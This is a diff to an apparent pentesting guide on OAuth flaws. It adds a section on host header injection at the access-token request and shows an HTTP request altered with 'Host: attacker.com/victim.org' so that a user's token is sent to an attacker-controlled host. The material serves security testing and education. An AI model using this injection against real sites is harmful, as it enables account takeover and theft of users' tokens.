@@ -311,6 +311,30 @@ The **authorization code should live just for some time to limit the time window
 If you can get the **authorization code and use it with a different client then you can takeover other accounts**.
 - **Refresh Token** ->     https://medium.com/@iknowhatodo/what-about-refreshtoken-19914d3f2e46
 
+
+### Host header injection at access token request
+
+Although quite uncommon it is sometimes good to test if the host is being validated at the server-side or not while carrying the access token. If it is not then there is a possibility to redirect the token to the malicious host via host header injection.
+
+For example consider the following original request,
+
+```
+GET /api/twitter/login?csrf=<redacted> HTTP/1.1
+Host: victim.org
+Referer:https://www.victim.org/
+Cookie:<redacted>
+```
+
+Here, upon clicking login with Twitter on victim.org we get this request now if you change the host to something like **_attacker.com/www.victim.org_** it will sometimes redirect the Oauth authorization link to the attacker and obtain the user’s account details via the token that is issued.
+
+_Edited request ,_
+
+```
+GET /api/twitter/login?csrf=<redacted> HTTP/1.1
+Host: attacker.com/victim.org
+Referer:https://www.victim.org/
+Cookie:<redacted>
+```
 ### Other Bugs
 - **[Race Conditions in OAuth 2 API implementations](https://hackerone.com/reports/55140)**
 - **[Misconfigured oauth leads to Pre account takeover](https://hackerone.com/reports/1074047)**
